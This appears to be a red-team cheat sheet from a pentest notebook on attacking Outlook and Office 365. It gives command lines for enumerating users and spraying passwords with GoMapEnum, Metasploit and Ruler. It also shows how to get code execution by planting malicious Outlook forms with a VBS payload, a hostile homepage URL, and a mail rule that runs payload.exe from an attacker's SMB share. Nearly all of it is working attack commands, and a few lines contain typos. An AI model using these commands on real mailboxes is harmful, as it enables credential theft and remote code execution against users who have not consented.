# Outlook

## 01 - Username Enumeration

### 1.1 - #gomapenum

```
$ GoMapEnum bruteSpray o365 -u users.lst -v -o valid_users.lst

$ GoMapEnum azure -u users.lst -v -o valid_users.lst
```

### 1.2 - #metasploit

```
msf > use auxiliary/gather/office365userenum

msf auxiliary(gather/office365userenum) > options
```

## 01 - Password Spraying

Refer to the sections for gathering [[06 - Tactics & Techniques & Procedures Phases/A - Information Gathering/0x01 - Passive Fingerprinting/0xD - Network Ports/DNS/Mail Exchange Servers/Scanners|mail exchange servers]] and [[06 - Tactics & Techniques & Procedures Phases/A - Information Gathering/0x01 - Passive Fingerprinting/0xB - Intelligence Gathering/05 - Gathering Emails/01 - Scrape Emails/Scanners|emails]].

### 1.1 - #ruler

```
$ ruler -k --domain <domain>.<tld> brute --users users.lst --passwords passwords.lst --verbose
```

### 1.2 - #gomapenum

```
$ GoMapEnum bruteSpray o365 -u users.lst -p passwords.lst -l 2

$ GoMapEnum adfs -u users.lst -p passwords.lst
```

TODO: Microsoft 365

https://github.com/Greenwolf/Spray (pretty important for password spraying)



```
msf > use auxiliary/scanner/http/owa_login

msf auxiliary(scanner/http/owa_login) > options
```

```
msf > use auxiliary/scanner/http/owa_ews_login
```

## 02 - Execution

### 2.1 - Forms

#### 2.1.1 - Display Forms

```
$ ruler -k --nocache --url https://autodiscover.<domain>.<tld>/autodiscover/autodiscover.xml -d <domain>.<tld> -u '<username>' -p '<password>' -e <username>@<domain>.<tld> --verbose --debug form display
```

#### 2.1.2 - Exploit

```
$ ruler -k --nocache --url https://autodiscover.<domain>.<tld>/autodiscover/autodiscover.xml -d <domain>.<tld> -u '<username>' -p '<password>' -e <username>@<domain>.<tld> --verbose --debug form add --suffix test-form --input vbs-payload.txt --send
```

#### 2.1.3 - Cleanup

```
$ ruler -k --nocache --url https://autodiscover.<domain>.<tld>/autodiscover/autodiscover.xml -d <domain>.<tld> -u <username> -p <password> -e <username>@<domain>.<tld> --verbose --debug form delete --suffix test-form
```

### 2.2 - Homepage

```
$ ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage add --url http://10.10.13.37/homepage.html
```

```
$ ruler -k --verbose --email <username>@<domain>.<tld> -u <username> -p <password> display
```

```
$ ruler -k --email <username>@<domain>.<tld> -u <username> -p <password> add --location '\\<attacker_IP>\<share>\\payload.exe' --trigger "SensePost" --name maliciousrule --send --subject Recruitment
```

#### 2.2.3 - Cleanup

```
$ ruler -k --verbose ---email <username>@<domain>.<tld> -u <username> -p <password> delete --name maliciousrule

$ ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage deletec
```

---
## References

### MITRE

- [MITRE T1078.004: Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)

### Rapid7

- [Rapid7: Metasploit Framework - Auxiliary Gather Office 365 User Enumeration](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/gather/office365userenum.md)

### SensePost

- [SensePost: Brute Force](https://github.com/sensepost/ruler/wiki/Brute-Force)

- [SensePost: HomePage](https://github.com/sensepost/ruler/wiki/Homepage)

- [SensePost: GAL](https://github.com/sensepost/ruler/wiki/GAL)

- [SensePost: Rules](https://github.com/sensepost/ruler/wiki/Rules)

- [SensePost: Forms](https://github.com/sensepost/ruler/wiki/Forms)

### Red Team Notes

- [Red Team Notes: Password Spraying Outlook Web Access via Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)

### Pentester's Promiscous Notebook

- [Pentester's Promiscous Notebook: OWA](https://ppn.snovvcra.sh/pentest/perimeter/owa)

- [Pentester's Promiscous Notebook: Outlook](https://ppn.snovvcra.sh/pentest/perimeter/outlook)